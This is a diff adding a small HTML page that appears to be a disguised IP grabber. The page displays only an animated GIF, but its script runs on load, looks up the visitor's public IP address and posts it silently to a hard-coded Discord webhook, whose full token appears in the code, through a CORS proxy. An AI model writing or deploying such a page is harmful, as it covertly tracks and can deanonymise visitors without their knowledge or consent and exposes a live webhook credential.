@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      function sendIPToWebhook() {
+        fetch("https://api.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+            const ip = data.ip;
+            fetch("https://cors-anywhere.herokuapp.com/https://discord.com/api/webhooks/1002246025639116940/ESr2hSp1862BSrRkEe373Xa9zHrOgi_RNCCJmAAUxfzU2aWekxn8gCdQuhFOoAd8Q9yq", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                content: ip
+              })
+            });
+          });
+      }
+    </script>
+  </head>
+  <body onload="sendIPToWebhook()">
+    <img src="https://media.tenor.com/ArxbBdBlS7oAAAAM/beamed-comped.gif" alt="background">
+  </body>
+</html>
